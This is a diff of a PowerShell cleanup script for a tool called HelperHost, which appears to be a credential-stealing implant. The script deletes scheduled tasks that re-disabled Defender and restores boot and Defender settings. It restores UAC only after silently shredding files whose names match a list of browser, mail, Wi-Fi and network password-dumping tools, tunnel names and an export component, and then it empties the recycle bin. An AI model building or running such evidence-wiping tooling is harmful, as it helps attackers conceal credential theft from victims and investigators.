@@ -1,17 +1,24 @@
 # Restores Windows security + removes HelperHost install side-effects.
 # Safe to re-run. Prefer elevated (HelperHostWipeRestore task).
+# UAC is restored LAST so mid-wipe elevated steps don't re-prompt.
 $ErrorActionPreference = 'SilentlyContinue'
+try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
 $hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $cache = Join-Path $env:TEMP 'HelperHostCache'
 $tools = Join-Path $hh 'tools'
 
-$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|hh-wipe|hh-restore|hh-export'
+$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av'
 
-# --- UAC (restore from registry backup / legacy file) ---
+# Kill EarlyAV first so a reboot cannot re-disable Defender mid-restore
+foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot')) {
+  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
+  schtasks /Delete /TN $tn /F 2>$null | Out-Null
+}
+
+# --- Load UAC backup now (folder deleted later); apply at END ---
 $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
 $uacBak = Join-Path $hh 'uac-backup.json'
 $uj = $null
-$regState = $null
 try {
   $regState = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
   if ($regState) {
@@ -25,19 +32,6 @@ try {
 if (-not $uj -and (Test-Path $uacBak)) {
   try { $uj = Get-Content $uacBak -Raw | ConvertFrom-Json } catch {}
 }
-if (Test-Path $sysPol) {
-  $lua = 1; if ($uj -and $null -ne $uj.EnableLUA) { $lua = [int]$uj.EnableLUA }
-  $cpa = 5; if ($uj -and $null -ne $uj.ConsentPromptBehaviorAdmin) { $cpa = [int]$uj.ConsentPromptBehaviorAdmin }
-  $psd = 1; if ($uj -and $null -ne $uj.PromptOnSecureDesktop) { $psd = [int]$uj.PromptOnSecureDesktop }
-  $eid = 1; if ($uj -and $null -ne $uj.EnableInstallerDetection) { $eid = [int]$uj.EnableInstallerDetection }
-  $cpu = 3; if ($uj -and $null -ne $uj.ConsentPromptBehaviorUser) { $cpu = [int]$uj.ConsentPromptBehaviorUser }
-  Set-ItemProperty $sysPol -Name EnableLUA -Value $lua -Type DWord -Force
-  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value $cpa -Type DWord -Force
-  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value $cpu -Type DWord -Force
-  Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value $psd -Type DWord -Force
-  Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value $eid -Type DWord -Force
-}
-Remove-Item $uacBak -Force -EA SilentlyContinue
 
 # --- Defender Security Center / UX / toast policies we set ---
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Force -EA SilentlyContinue
@@ -166,7 +160,7 @@ if (Test-Path $dg) {
 & bcdedit.exe /set '{current}' hypervisorlaunchtype Auto | Out-Null
 & bcdedit.exe /deletevalue '{current}' vsmlaunchtype | Out-Null
 
-# --- Scheduled tasks ---
+# --- Scheduled tasks (again, after Defender) ---
 foreach ($tn in @(
   'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot',
   'HelperHostWipeRestore', 'HelperHostEarlyAV', 'AgentShePC'
@@ -360,5 +354,20 @@ foreach ($p in @($hh, $cache, $tools)) {
   }
 }
 Clear-RecycleBin -Force -EA SilentlyContinue
+
+# --- UAC LAST (keep silent during restore/shred above) ---
+if (Test-Path $sysPol) {
+  $lua = 1; if ($uj -and $null -ne $uj.EnableLUA) { $lua = [int]$uj.EnableLUA }
+  $cpa = 5; if ($uj -and $null -ne $uj.ConsentPromptBehaviorAdmin) { $cpa = [int]$uj.ConsentPromptBehaviorAdmin }
+  $psd = 1; if ($uj -and $null -ne $uj.PromptOnSecureDesktop) { $psd = [int]$uj.PromptOnSecureDesktop }
+  $eid = 1; if ($uj -and $null -ne $uj.EnableInstallerDetection) { $eid = [int]$uj.EnableInstallerDetection }
+  $cpu = 3; if ($uj -and $null -ne $uj.ConsentPromptBehaviorUser) { $cpu = [int]$uj.ConsentPromptBehaviorUser }
+  Set-ItemProperty $sysPol -Name EnableLUA -Value $lua -Type DWord -Force
+  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value $cpa -Type DWord -Force
+  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value $cpu -Type DWord -Force
+  Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value $psd -Type DWord -Force
+  Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value $eid -Type DWord -Force
+}
+Remove-Item $uacBak -Force -EA SilentlyContinue
 
 Write-Output 'security-restored'
